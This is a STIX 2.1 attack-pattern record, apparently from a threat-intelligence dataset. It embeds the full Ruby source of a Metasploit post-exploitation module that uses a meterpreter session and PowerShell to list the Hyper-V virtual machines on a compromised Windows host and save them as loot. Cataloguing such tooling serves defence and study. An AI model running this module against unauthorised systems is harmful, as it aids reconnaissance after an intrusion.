{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2addcbef-08dc-40b5-86bc-daf1d0f277e3",
    "created": "2024-08-14T16:33:05.04939Z",
    "modified": "2024-08-14T16:33:05.049394Z",
    "name": "Windows Hyper-V VM Enumeration",
    "description": " This module will check if the target machine is a Hyper-V host and, if it is, will return a list of all of the VMs running on the host, as well as stats such as their state, version, CPU Usage, uptime, and status.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_hyperv_vms.rb",
            "external_id": "enum_hyperv_vms.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Hyper-V VM Enumeration',\n        'Description' => %q{\n          This module will check if the target machine is a Hyper-V host and, if it is, will return a list of all\n          of the VMs running on the host, as well as stats such as their state, version, CPU Usage, uptime, and status.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'gwillcox-r7' # Metasploit post module\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n      )\n  end\n\n  def run\n    unless have_powershell?\n      fail_with(Failure::NoAccess, \"The target does not have PowerShell installed so we can't access the state of the Hyper-V VMs\")\n    end\n    error_token = Rex::Text.rand_text_alpha(8)\n    get_vm = \"try { Get-VM } catch {echo #{error_token}; echo $Error[0]}\"\n    results = psh_exec(get_vm)\n    if results.starts_with?(error_token)\n      results = results.delete_prefix(error_token).strip\n      print_error('Error running `Get-VM` command:')\n      print_line(results)\n      return\n    end\n    vprint_status(results)\n    filtered_result = results.match(/^Name(?:.+\\r\\n){1,2000}/) # If your running more than 2000 VMs on a single host, you have my sincerest sympathy.\n    if filtered_result.nil?\n      print_error(\"Sorry, no results were found! Perhaps the target has Hyper-V installed but doesn't have any VMs set up?\")\n      return\n    end\n    print_status(filtered_result.to_s)\n    loot_location = store_loot('host.hyperv_vms', 'text/plain', session, filtered_result.to_s, \"#{session.session_host}.hyperv_vm_information.txt\", \"#{session.session_host} Hyper-V VM Information\")\n    print_good(\"Stored loot at #{loot_location}\")\n  end\nend\n"
}